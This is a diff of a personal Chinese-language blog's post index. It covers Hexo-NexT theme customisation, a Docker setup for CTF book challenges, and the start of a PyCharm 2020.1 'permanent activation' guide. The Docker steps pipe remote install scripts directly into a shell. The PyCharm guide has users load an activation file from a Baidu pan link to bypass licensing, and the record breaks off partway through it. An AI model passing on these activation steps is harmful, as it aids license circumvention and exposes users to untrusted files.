@@ -31,6 +31,31 @@
       </tags>
   </entry>
   <entry>
+    <title>Hexo-NexT 设置近期文章</title>
+    <url>/Hexo-NexT%20%E8%AE%BE%E7%BD%AE%E8%BF%91%E6%9C%9F%E6%96%87%E7%AB%A0/</url>
+    <content><![CDATA[<ol>
+<li><p>新建 source/_data/sidebar.njk 文件，内容如下：</p>
+<span id="more"></span>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;# RecentPosts #&#125;</span><br><span class="line">&#123;%- if theme.recent_posts %&#125;</span><br><span class="line">  &lt;div class&#x3D;&quot;links-of-recent-posts motion-element&quot;&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;links-of-recent-posts-title&quot;&gt;</span><br><span class="line">      &#123;%- if theme.recent_posts.icon %&#125;</span><br><span class="line">      &lt;i class&#x3D;&quot;&#123;&#123; theme.recent_posts.icon &#125;&#125; fa-fw&quot;&gt;&lt;&#x2F;i&gt;</span><br><span class="line">      &#123;%- endif %&#125;</span><br><span class="line">      &#123;&#123; theme.recent_posts.title &#125;&#125;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">    &lt;ul class&#x3D;&quot;links-of-recent-posts-list&quot;&gt;</span><br><span class="line">      &#123;%- set posts &#x3D; site.posts.sort(&#39;date&#39;, &#39;desc&#39;).toArray() %&#125;</span><br><span class="line">      &#123;%- for post in posts.slice(&#39;0&#39;, theme.recent_posts.max_count) %&#125;</span><br><span class="line">        &lt;li class&#x3D;&quot;links-of-recent-posts-item&quot;&gt;</span><br><span class="line">          &#123;&#123; next_url(post.path, post.title, &#123;title: post.path&#125;) &#125;&#125;</span><br><span class="line">        &lt;&#x2F;li&gt;</span><br><span class="line">      &#123;%- endfor %&#125;</span><br><span class="line">    &lt;&#x2F;ul&gt;</span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">&#123;%- endif %&#125;</span><br></pre></td></tr></table></figure></li>
+<li><p>修改_config.next.yml，取消 custom_file_path 中的 sidebar 和 style 两个注释，并新增 recent_posts 内容。variable 应该是设置另外的功能时打开的，和此处无关。实际上我的 sidebar 原本是 source/_data/sidebar.swig, 直接改成 njk 的没问题。</p>
+<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">custom_file_path:</span></span><br><span class="line">  <span class="comment">#head: source/_data/head.swig</span></span><br><span class="line">  <span class="comment">#header: source/_data/header.swig</span></span><br><span class="line">  <span class="attr">sidebar:</span> <span class="string">source/_data/sidebar.njk</span></span><br><span class="line">  <span class="comment">#postMeta: source/_data/post-meta.swig</span></span><br><span class="line">  <span class="comment">#postBodyEnd: source/_data/post-body-end.swig</span></span><br><span class="line">  <span class="comment">#footer: source/_data/footer.swig</span></span><br><span class="line">  <span class="comment">#bodyEnd: source/_data/body-end.swig</span></span><br><span class="line">  <span class="attr">variable:</span> <span class="string">source/_data/variables.styl</span></span><br><span class="line">  <span class="comment">#mixin: source/_data/mixins.styl</span></span><br><span class="line">  <span class="attr">style:</span> <span class="string">source/_data/styles.styl</span></span><br><span class="line"></span><br><span class="line"><span class="attr">recent_posts:</span></span><br><span class="line"><span class="comment"># 块标题</span></span><br><span class="line">  <span class="attr">title:</span> <span class="string">最近文章</span></span><br><span class="line"><span class="comment"># 图标</span></span><br><span class="line">  <span class="attr">icon:</span> <span class="string">fa</span> <span class="string">fa-history</span></span><br><span class="line"><span class="comment"># 最多多少文章链接</span></span><br><span class="line">  <span class="attr">max_count:</span> <span class="number">5</span></span><br></pre></td></tr></table></figure></li>
+<li><p>修改 source/_data/styles.styl 文件，文件不存在新建即可。添加如下代码：</p>
+<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">// 近期文章</span><br><span class="line"><span class="selector-class">.links-of-recent-posts</span></span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">0.8125em</span></span><br><span class="line">  margin-top: <span class="number">10px</span></span><br><span class="line"></span><br><span class="line">.links-of-recent-posts-title</span><br><span class="line">  font-size: <span class="number">1.03em</span></span><br><span class="line">  font-weight: <span class="number">600</span></span><br><span class="line">  margin-top: <span class="number">0</span></span><br><span class="line"></span><br><span class="line">.links-of-recent-posts-list</span><br><span class="line">  list-style: none</span><br><span class="line">  margin: <span class="number">0</span></span><br><span class="line">  padding: <span class="number">0</span></span><br></pre></td></tr></table></figure></li>
+</ol>
+<p>——————————<br><strong>参考</strong></p>
+<ul>
+<li><a href="https://weilining.github.io/925-1.html">Hexo NexT 添加近期文章功能</a></li>
+</ul>
+]]></content>
+      <categories>
+        <category>网站建设</category>
+        <category>Hexo 博客</category>
+      </categories>
+      <tags>
+        <tag>Hexo 博客</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>security tools</title>
     <url>/security%20tools/</url>
     <content><![CDATA[<p>收集学习网安过程中遇到的工具</p>
@@ -103,6 +128,54 @@
       </tags>
   </entry>
   <entry>
+    <title>如何搭建《从0到1：CTFer 成长之路》docker 做题环境</title>
+    <url>/%E5%A6%82%E4%BD%95%E6%90%AD%E5%BB%BA%E3%80%8A%E4%BB%8E0%E5%88%B01%EF%BC%9ACTFer%20%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%E3%80%8Bdocker%20%E5%81%9A%E9%A2%98%E7%8E%AF%E5%A2%83/</url>
+    <content><![CDATA[<p>《从0到1：CTFer 成长之路》书中涉及的题目已经封装成 docker 镜像，通过 docker 很容易能在本地实现做题的环境。</p>
+<span id="more"></span>
+
+<h2 id="1-安装-docker"><a href="#1-安装-docker" class="headerlink" title="1. 安装 docker"></a>1. 安装 docker</h2><ul>
+<li>使用官方安装脚本安装<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo curl -fsSL https:&#x2F;&#x2F;get.docker.com | bash -s docker --mirror Aliyun</span><br></pre></td></tr></table></figure></li>
+<li>也可以使用国内 daocloud 一键安装命令：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo curl -sSL https:&#x2F;&#x2F;get.daocloud.io&#x2F;docker | sh</span><br></pre></td></tr></table></figure>
+详细文档：<a href="https://www.runoob.com/docker/ubuntu-docker-install.html">https://www.runoob.com/docker/ubuntu-docker-install.html</a><blockquote>
+<p>由于之前使用了 snap 安装过 docker，运行 docker 命令出现：<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; bash:/snap/bin/docker: No such file or directory<br>而实际上使用官方安装脚本安装后的 docker 应该链接至：/usr/bin/docker<br>因此将 /snap/bin/docker 链接至 /usr/bin/docker 即可</p>
+</blockquote>
+</li>
+<li>查看 docker 镜像<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo docker images</span><br></pre></td></tr></table></figure></li>
+<li>重启 docker 服务<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl restart docker</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="2-docker-换源"><a href="#2-docker-换源" class="headerlink" title="2. docker 换源"></a>2. docker 换源</h2><ul>
+<li>docker换源的配置文件默认在<code>/etc/docker/daemon.json</code>，若无 <code>daemon.json</code>，直接创建即可<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;etc&#x2F;docker</span><br><span class="line"># 若该目录下无 daemon.json，直接创建</span><br><span class="line">sudo touch daemon.json</span><br><span class="line"></span><br><span class="line">sudo vim daemon.json</span><br><span class="line"># 将下面内容输入到 daemon.json 中</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot; : [</span><br><span class="line">    &quot;http:&#x2F;&#x2F;ovfftd6p.mirror.aliyuncs.com&quot;,</span><br><span class="line">    &quot;http:&#x2F;&#x2F;registry.docker-cn.com&quot;,</span><br><span class="line">    &quot;http:&#x2F;&#x2F;docker.mirrors.ustc.edu.cn&quot;,</span><br><span class="line">    &quot;http:&#x2F;&#x2F;hub-mirror.c.163.com&quot;</span><br><span class="line">  ],</span><br><span class="line">  &quot;insecure-registries&quot; : [</span><br><span class="line">    &quot;registry.docker-cn.com&quot;,</span><br><span class="line">    &quot;docker.mirrors.ustc.edu.cn&quot;</span><br><span class="line">  ],</span><br><span class="line">  &quot;debug&quot; : true,</span><br><span class="line">  &quot;experimental&quot; : true</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+<li>保存并重启 docker 服务<br>确定是否换源成功，如果如下命令能看到 daemon.json 里的网址表示换源成功<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl restart docker</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo docker info</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="3-安装-docker-compose"><a href="#3-安装-docker-compose" class="headerlink" title="3. 安装 docker-compose"></a>3. 安装 docker-compose</h2><blockquote>
+<p>docker-compose 是用于定义和运行多容器 Docker 应用程序的工具。通过 Compose，可以使用 YML 文件来配置应用程序需要的所有服务。然后，使用一个命令，就可以从 YML 文件配置中创建并启动所有服务。</p>
+</blockquote>
+<ul>
+<li>从 Github 安装<br> 使用 curl 下载 1.27.4版本，如果需要安装其他版本，修改版本号即可。<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -L &quot;https:&#x2F;&#x2F;github.com&#x2F;docker&#x2F;compose&#x2F;releases&#x2F;download&#x2F;1.27.4&#x2F;docker-compose-$(uname -s)-$(uname -m)&quot; -o &#x2F;usr&#x2F;local&#x2F;bin&#x2F;docker-compose</span><br></pre></td></tr></table></figure></li>
+<li>增加执行权限<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chmod +x &#x2F;usr&#x2F;local&#x2F;bin&#x2F;docker-compose</span><br></pre></td></tr></table></figure></li>
+<li>创建软链接<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ln -s &#x2F;usr&#x2F;local&#x2F;bin&#x2F;docker-compose &#x2F;usr&#x2F;bin&#x2F;docker-compose</span><br></pre></td></tr></table></figure></li>
+<li>测试是否安装成功<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># sudo docker-compose --version</span><br><span class="line">docker-compose --version</span><br></pre></td></tr></table></figure>
+<h2 id="4-配置具体题目环境-docker-compose-yml"><a href="#4-配置具体题目环境-docker-compose-yml" class="headerlink" title="4. 配置具体题目环境 docker-compose.yml"></a>4. 配置具体题目环境 docker-compose.yml</h2></li>
+<li>在 home/用户 下 创建一个测试目录 compose<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdir compose</span><br></pre></td></tr></table></figure></li>
+<li>配置 docker-compose.yml，若不存在此文件，直接新建<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># yaml 配置:SQL 注入-1</span><br><span class="line">version: &#39;3.2&#39;</span><br><span class="line">services:</span><br><span class="line">  web:</span><br><span class="line">    image: registry.cn-hangzhou.aliyuncs.com&#x2F;n1book&#x2F;web-information-backk:latest</span><br><span class="line">    ports:</span><br><span class="line">        - 80:80</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="5-启动方式"><a href="#5-启动方式" class="headerlink" title="5. 启动方式"></a>5. 启动方式</h2><p>在当前题目配置 docker-compose.yml 所在文件夹，执行以下命令</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br><span class="line"></span><br><span class="line">or </span><br><span class="line"></span><br><span class="line">sudo docker-compose up -d</span><br></pre></td></tr></table></figure>
+<p>可以对每个题目都创建一个文件夹，里面存放这个题目的 docker-compose.yml，这样需要启动某个题目环境的时候直接进它的目录执行启动指令即可。</p>
+]]></content>
+      <categories>
+        <category>网络安全</category>
+        <category>CTF</category>
+        <category>《从0到1：CTFer成长之路》</category>
+      </categories>
+      <tags>
+        <tag>网络安全</tag>
+        <tag>搭建环境</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>如何为 Git 设置代理</title>
     <url>/%E5%A6%82%E4%BD%95%E4%B8%BA%20Git%20%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86/</url>
     <content><![CDATA[<h2 id="1-连接情况总览"><a href="#1-连接情况总览" class="headerlink" title="1. 连接情况总览"></a>1. 连接情况总览</h2><p>如果在克隆或从远程仓库获取数据时遇到很慢甚至超时的情况，那么此时可能需要配置 Git 的代理。这里讲讲两种情况的代理方法：使用 HTTP 或 HTTPS 协议连接到 Git 仓库的代理方法和使用 SSH 协议连接到 Git 仓库的代理方法。</p>
@@ -164,79 +237,6 @@
       </categories>
       <tags>
         <tag>代理</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Hexo-NexT 设置近期文章</title>
-    <url>/Hexo-NexT%20%E8%AE%BE%E7%BD%AE%E8%BF%91%E6%9C%9F%E6%96%87%E7%AB%A0/</url>
-    <content><![CDATA[<ol>
-<li><p>新建 source/_data/sidebar.njk 文件，内容如下：</p>
-<span id="more"></span>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;# RecentPosts #&#125;</span><br><span class="line">&#123;%- if theme.recent_posts %&#125;</span><br><span class="line">  &lt;div class&#x3D;&quot;links-of-recent-posts motion-element&quot;&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;links-of-recent-posts-title&quot;&gt;</span><br><span class="line">      &#123;%- if theme.recent_posts.icon %&#125;</span><br><span class="line">      &lt;i class&#x3D;&quot;&#123;&#123; theme.recent_posts.icon &#125;&#125; fa-fw&quot;&gt;&lt;&#x2F;i&gt;</span><br><span class="line">      &#123;%- endif %&#125;</span><br><span class="line">      &#123;&#123; theme.recent_posts.title &#125;&#125;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">    &lt;ul class&#x3D;&quot;links-of-recent-posts-list&quot;&gt;</span><br><span class="line">      &#123;%- set posts &#x3D; site.posts.sort(&#39;date&#39;, &#39;desc&#39;).toArray() %&#125;</span><br><span class="line">      &#123;%- for post in posts.slice(&#39;0&#39;, theme.recent_posts.max_count) %&#125;</span><br><span class="line">        &lt;li class&#x3D;&quot;links-of-recent-posts-item&quot;&gt;</span><br><span class="line">          &#123;&#123; next_url(post.path, post.title, &#123;title: post.path&#125;) &#125;&#125;</span><br><span class="line">        &lt;&#x2F;li&gt;</span><br><span class="line">      &#123;%- endfor %&#125;</span><br><span class="line">    &lt;&#x2F;ul&gt;</span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">&#123;%- endif %&#125;</span><br></pre></td></tr></table></figure></li>
-<li><p>修改_config.next.yml，取消 custom_file_path 中的 sidebar 和 style 两个注释，并新增 recent_posts 内容。variable 应该是设置另外的功能时打开的，和此处无关。实际上我的 sidebar 原本是 source/_data/sidebar.swig, 直接改成 njk 的没问题。</p>
-<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">custom_file_path:</span></span><br><span class="line">  <span class="comment">#head: source/_data/head.swig</span></span><br><span class="line">  <span class="comment">#header: source/_data/header.swig</span></span><br><span class="line">  <span class="attr">sidebar:</span> <span class="string">source/_data/sidebar.njk</span></span><br><span class="line">  <span class="comment">#postMeta: source/_data/post-meta.swig</span></span><br><span class="line">  <span class="comment">#postBodyEnd: source/_data/post-body-end.swig</span></span><br><span class="line">  <span class="comment">#footer: source/_data/footer.swig</span></span><br><span class="line">  <span class="comment">#bodyEnd: source/_data/body-end.swig</span></span><br><span class="line">  <span class="attr">variable:</span> <span class="string">source/_data/variables.styl</span></span><br><span class="line">  <span class="comment">#mixin: source/_data/mixins.styl</span></span><br><span class="line">  <span class="attr">style:</span> <span class="string">source/_data/styles.styl</span></span><br><span class="line"></span><br><span class="line"><span class="attr">recent_posts:</span></span><br><span class="line"><span class="comment"># 块标题</span></span><br><span class="line">  <span class="attr">title:</span> <span class="string">最近文章</span></span><br><span class="line"><span class="comment"># 图标</span></span><br><span class="line">  <span class="attr">icon:</span> <span class="string">fa</span> <span class="string">fa-history</span></span><br><span class="line"><span class="comment"># 最多多少文章链接</span></span><br><span class="line">  <span class="attr">max_count:</span> <span class="number">5</span></span><br></pre></td></tr></table></figure></li>
-<li><p>修改 source/_data/styles.styl 文件，文件不存在新建即可。添加如下代码：</p>
-<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">// 近期文章</span><br><span class="line"><span class="selector-class">.links-of-recent-posts</span></span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">0.8125em</span></span><br><span class="line">  margin-top: <span class="number">10px</span></span><br><span class="line"></span><br><span class="line">.links-of-recent-posts-title</span><br><span class="line">  font-size: <span class="number">1.03em</span></span><br><span class="line">  font-weight: <span class="number">600</span></span><br><span class="line">  margin-top: <span class="number">0</span></span><br><span class="line"></span><br><span class="line">.links-of-recent-posts-list</span><br><span class="line">  list-style: none</span><br><span class="line">  margin: <span class="number">0</span></span><br><span class="line">  padding: <span class="number">0</span></span><br></pre></td></tr></table></figure></li>
-</ol>
-<p>——————————<br><strong>参考</strong></p>
-<ul>
-<li><a href="https://weilining.github.io/925-1.html">Hexo NexT 添加近期文章功能</a></li>
-</ul>
-]]></content>
-      <categories>
-        <category>网站建设</category>
-        <category>Hexo 博客</category>
-      </categories>
-      <tags>
-        <tag>Hexo 博客</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>如何搭建《从0到1：CTFer 成长之路》docker 做题环境</title>
-    <url>/%E5%A6%82%E4%BD%95%E6%90%AD%E5%BB%BA%E3%80%8A%E4%BB%8E0%E5%88%B01%EF%BC%9ACTFer%20%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%E3%80%8Bdocker%20%E5%81%9A%E9%A2%98%E7%8E%AF%E5%A2%83/</url>
-    <content><![CDATA[<p>《从0到1：CTFer 成长之路》书中涉及的题目已经封装成 docker 镜像，通过 docker 很容易能在本地实现做题的环境。</p>
-<span id="more"></span>
-
-<h2 id="1-安装-docker"><a href="#1-安装-docker" class="headerlink" title="1. 安装 docker"></a>1. 安装 docker</h2><ul>
-<li>使用官方安装脚本安装<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo curl -fsSL https:&#x2F;&#x2F;get.docker.com | bash -s docker --mirror Aliyun</span><br></pre></td></tr></table></figure></li>
-<li>也可以使用国内 daocloud 一键安装命令：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo curl -sSL https:&#x2F;&#x2F;get.daocloud.io&#x2F;docker | sh</span><br></pre></td></tr></table></figure>
-详细文档：<a href="https://www.runoob.com/docker/ubuntu-docker-install.html">https://www.runoob.com/docker/ubuntu-docker-install.html</a><blockquote>
-<p>由于之前使用了 snap 安装过 docker，运行 docker 命令出现：<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; bash:/snap/bin/docker: No such file or directory<br>而实际上使用官方安装脚本安装后的 docker 应该链接至：/usr/bin/docker<br>因此将 /snap/bin/docker 链接至 /usr/bin/docker 即可</p>
-</blockquote>
-</li>
-<li>查看 docker 镜像<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo docker images</span><br></pre></td></tr></table></figure></li>
-<li>重启 docker 服务<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl restart docker</span><br></pre></td></tr></table></figure></li>
-</ul>
-<h2 id="2-docker-换源"><a href="#2-docker-换源" class="headerlink" title="2. docker 换源"></a>2. docker 换源</h2><ul>
-<li>docker换源的配置文件默认在<code>/etc/docker/daemon.json</code>，若无 <code>daemon.json</code>，直接创建即可<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;etc&#x2F;docker</span><br><span class="line"># 若该目录下无 daemon.json，直接创建</span><br><span class="line">sudo touch daemon.json</span><br><span class="line"></span><br><span class="line">sudo vim daemon.json</span><br><span class="line"># 将下面内容输入到 daemon.json 中</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot; : [</span><br><span class="line">    &quot;http:&#x2F;&#x2F;ovfftd6p.mirror.aliyuncs.com&quot;,</span><br><span class="line">    &quot;http:&#x2F;&#x2F;registry.docker-cn.com&quot;,</span><br><span class="line">    &quot;http:&#x2F;&#x2F;docker.mirrors.ustc.edu.cn&quot;,</span><br><span class="line">    &quot;http:&#x2F;&#x2F;hub-mirror.c.163.com&quot;</span><br><span class="line">  ],</span><br><span class="line">  &quot;insecure-registries&quot; : [</span><br><span class="line">    &quot;registry.docker-cn.com&quot;,</span><br><span class="line">    &quot;docker.mirrors.ustc.edu.cn&quot;</span><br><span class="line">  ],</span><br><span class="line">  &quot;debug&quot; : true,</span><br><span class="line">  &quot;experimental&quot; : true</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
-<li>保存并重启 docker 服务<br>确定是否换源成功，如果如下命令能看到 daemon.json 里的网址表示换源成功<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl restart docker</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo docker info</span><br></pre></td></tr></table></figure></li>
-</ul>
-<h2 id="3-安装-docker-compose"><a href="#3-安装-docker-compose" class="headerlink" title="3. 安装 docker-compose"></a>3. 安装 docker-compose</h2><blockquote>
-<p>docker-compose 是用于定义和运行多容器 Docker 应用程序的工具。通过 Compose，可以使用 YML 文件来配置应用程序需要的所有服务。然后，使用一个命令，就可以从 YML 文件配置中创建并启动所有服务。</p>
-</blockquote>
-<ul>
-<li>从 Github 安装<br> 使用 curl 下载 1.27.4版本，如果需要安装其他版本，修改版本号即可。<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -L &quot;https:&#x2F;&#x2F;github.com&#x2F;docker&#x2F;compose&#x2F;releases&#x2F;download&#x2F;1.27.4&#x2F;docker-compose-$(uname -s)-$(uname -m)&quot; -o &#x2F;usr&#x2F;local&#x2F;bin&#x2F;docker-compose</span><br></pre></td></tr></table></figure></li>
-<li>增加执行权限<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chmod +x &#x2F;usr&#x2F;local&#x2F;bin&#x2F;docker-compose</span><br></pre></td></tr></table></figure></li>
-<li>创建软链接<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ln -s &#x2F;usr&#x2F;local&#x2F;bin&#x2F;docker-compose &#x2F;usr&#x2F;bin&#x2F;docker-compose</span><br></pre></td></tr></table></figure></li>
-<li>测试是否安装成功<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># sudo docker-compose --version</span><br><span class="line">docker-compose --version</span><br></pre></td></tr></table></figure>
-<h2 id="4-配置具体题目环境-docker-compose-yml"><a href="#4-配置具体题目环境-docker-compose-yml" class="headerlink" title="4. 配置具体题目环境 docker-compose.yml"></a>4. 配置具体题目环境 docker-compose.yml</h2></li>
-<li>在 home/用户 下 创建一个测试目录 compose<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdir compose</span><br></pre></td></tr></table></figure></li>
-<li>配置 docker-compose.yml，若不存在此文件，直接新建<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># yaml 配置:SQL 注入-1</span><br><span class="line">version: &#39;3.2&#39;</span><br><span class="line">services:</span><br><span class="line">  web:</span><br><span class="line">    image: registry.cn-hangzhou.aliyuncs.com&#x2F;n1book&#x2F;web-information-backk:latest</span><br><span class="line">    ports:</span><br><span class="line">        - 80:80</span><br></pre></td></tr></table></figure></li>
-</ul>
-<h2 id="5-启动方式"><a href="#5-启动方式" class="headerlink" title="5. 启动方式"></a>5. 启动方式</h2><p>在当前题目配置 docker-compose.yml 所在文件夹，执行以下命令</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br><span class="line"></span><br><span class="line">or </span><br><span class="line"></span><br><span class="line">sudo docker-compose up -d</span><br></pre></td></tr></table></figure>
-<p>可以对每个题目都创建一个文件夹，里面存放这个题目的 docker-compose.yml，这样需要启动某个题目环境的时候直接进它的目录执行启动指令即可。</p>
-]]></content>
-      <categories>
-        <category>网络安全</category>
-        <category>CTF</category>
-        <category>《从0到1：CTFer成长之路》</category>
-      </categories>
-      <tags>
-        <tag>网络安全</tag>
-        <tag>搭建环境</tag>
       </tags>
   </entry>
   <entry>
@@ -305,6 +305,29 @@
       </tags>
   </entry>
   <entry>
+    <title>Hexo-NexT 设置圆角</title>
+    <url>/Hexo-NexT%20%E8%AE%BE%E7%BD%AE%E5%9C%86%E8%A7%92/Hexo-NexT%20%E8%AE%BE%E7%BD%AE%E5%9C%86%E8%A7%92/</url>
+    <content><![CDATA[<ol>
+<li><p>在 blog_root/source/_data/variables.styl 中增加下列代码：</p>
+<span id="more"></span>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">// 圆角设置</span><br><span class="line">$border-radius-inner     = 20px;</span><br><span class="line">$border-radius           = 20px;</span><br></pre></td></tr></table></figure></li>
+<li><p>然后在 NexT 的配置文件 _config.yml 中取消 variables.styl 的注释：</p>
+<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">variable:</span> <span class="string">source/_data/variables.styl</span></span><br></pre></td></tr></table></figure></li>
+<li><p>问题描述<br>侧边栏的圆角明显有一层阴影，圆角效果不明显<br><img src="circle_problem.png" alt="problem"></p>
+</li>
+<li><p>问题解决<br>github issues 上也有人提过类似的问题<a href="https://github.com/next-theme/hexo-theme-next/issues/51">侧边栏顶栏无法显示为圆角</a>，并且给出了回答。<br><img src="issues_answer.png" alt="issues"><br>回答中有提到黑色背景覆盖了圆角，所以我尝试了下将黑色改为透明，成功实现。具体是修改 /themes/next/source/css/_variables/Gemini.styl 内代码,将 $body-bg-color 赋值为透明 transparent。</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">// Variables of Gemini scheme</span><br><span class="line">// ==================================================</span><br><span class="line"></span><br><span class="line"><span class="keyword">@import</span> <span class="string">&quot;Pisces.styl&quot;</span>;</span><br><span class="line"></span><br><span class="line">// Settings for some of the most global styles.</span><br><span class="line">// --------------------------------------------------</span><br><span class="line">$body-bg-color           = #eee;</span><br><span class="line">// $body-bg-color           = transparent;</span><br><span class="line">// Borders.</span><br><span class="line">// --------------------------------------------------</span><br><span class="line">$box-shadow-inner        = 0 2px 2px 0 rgba(0, 0, 0, .12), 0 3px 1px -2px rgba(0, 0, 0, .06), 0 1px 5px 0 rgba(0, 0, 0, .12);</span><br><span class="line">$box-shadow              = 0 2px 2px 0 rgba(0, 0, 0, .12), 0 3px 1px -2px rgba(0, 0, 0, .06), 0 1px 5px 0 rgba(0, 0, 0, .12), 0 -1px .5px 0 rgba(0, 0, 0, .09);</span><br><span class="line"></span><br><span class="line">// $border-radius-inner     = 20px;</span><br><span class="line">// $border-radius           = 20px;</span><br><span class="line"></span><br><span class="line">$border-radius-inner     = initial;</span><br><span class="line">$border-radius           = initial;</span><br><span class="line">// $border-radius-inner     = 0 0 3px 3px;</span><br><span class="line">// $border-radius           = 3px;</span><br></pre></td></tr></table></figure></li>
+</ol>
+]]></content>
+      <categories>
+        <category>网站建设</category>
+        <category>Hexo 博客</category>
+      </categories>
+      <tags>
+        <tag>Hexo 博客</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Hexo-NexT 分类多层级描述</title>
     <url>/Hexo-NexT%20%E5%88%86%E7%B1%BB%E5%A4%9A%E5%B1%82%E7%BA%A7%E6%8F%8F%E8%BF%B0/Hexo-NexT%20%E5%88%86%E7%B1%BB%E5%A4%9A%E5%B1%82%E7%BA%A7%E6%8F%8F%E8%BF%B0/</url>
     <content><![CDATA[<ol>
@@ -330,6 +353,51 @@
       </categories>
       <tags>
         <tag>Hexo 博客</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Ubuntu中Pycharm专业版2020.1 安装，永久激活</title>
+    <url>/Ubuntu%E4%B8%ADPycharm%E4%B8%93%E4%B8%9A%E7%89%882020.1%20%E5%AE%89%E8%A3%85%EF%BC%8C%E6%B0%B8%E4%B9%85%E6%BF%80%E6%B4%BB/Ubuntu%E4%B8%ADPycharm%E4%B8%93%E4%B8%9A%E7%89%882020.1%20%E5%AE%89%E8%A3%85%EF%BC%8C%E6%B0%B8%E4%B9%85%E6%BF%80%E6%B4%BB/</url>
+    <content><![CDATA[<p>记录下 Ubuntu 中 Pycharm 专业版2020.1 安装激活</p>
+<span id="more"></span>
+
+<h2 id="一、安装"><a href="#一、安装" class="headerlink" title="一、安装"></a>一、安装</h2><ol>
+<li><p>从官网下载 Pycharm Linux 专业版</p>
+<p>官网链接：<a href="https://www.jetbrains.com/pycharm/download/#section=linux">https://www.jetbrains.com/pycharm/download/#section=linux</a></p>
+<p>注意只适用于 2020.1 版本</p>
+</li>
+<li><p>解压pycharm-professional-2020.1.tar.gz</p>
+</li>
+<li><p>来到<code>pycharm解压的路径/pycharm-2020.1/bin</code>下，终端运行 pycharm，命令<code>./pycharm.sh</code><br><img src="pycharm_sh.jpg" alt="pycharm"></p>
+</li>
+<li><p>选择Evaluate for free，之后点击Evaluate<br><img src="pycharm_evaluate.jpg" alt="pycharm"></p>
+</li>
+<li><p>在看到如下界面后开始进行永久激活Pycharm<br><img src="welcome_pycharm.jpg" alt="pycharm"></p>
+</li>
+</ol>
+<h2 id="激活"><a href="#激活" class="headerlink" title="激活"></a>激活</h2><ol>
+<li><p>下载激活文件</p>
+<blockquote>
+<p><a href="https://pan.baidu.com/s/1_WvpBVTG7OGRoAvBRdlhnw">https://pan.baidu.com/s/1_WvpBVTG7OGRoAvBRdlhnw</a><br>提取码：x1k5</p>
+</blockquote>
+</li>
+<li><p>将激活文件拖到 pycharm 主页面，然后点击 restart<br><img src="activation_restart.jpg" alt="pycharm"></p>
+</li>
